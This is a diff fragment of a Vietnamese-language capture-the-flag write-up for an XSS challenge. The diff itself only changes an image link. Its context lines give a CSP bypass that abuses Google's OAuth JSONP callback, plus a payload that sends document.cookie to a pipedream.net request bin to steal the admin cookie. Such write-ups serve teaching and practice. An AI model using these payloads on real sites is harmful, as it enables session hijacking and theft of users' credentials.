@@ -28,7 +28,7 @@
     `<script type="text/javascript" src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`
     - Vì viết writeup hơi muộn nên web đóng mất tiêu rồi. Ảnh nào có thì up luôn, ảnh nào không có thì đi mượn ké vậy...
 
-    [alert](image/alert.png)
+    [alert](alert.png)
    - Thành công mỹ mãn, giờ thì dễ rồi. Tạo 1 requestsbin ngay và luôn để hứng flag thôi chứ làm gì
    - đoạn payload để get cookie admin của mình: `location.replace('https://enzbo4rvhzz9n.x.pipedream.net/?key='%2bdocument.cookie)`
 
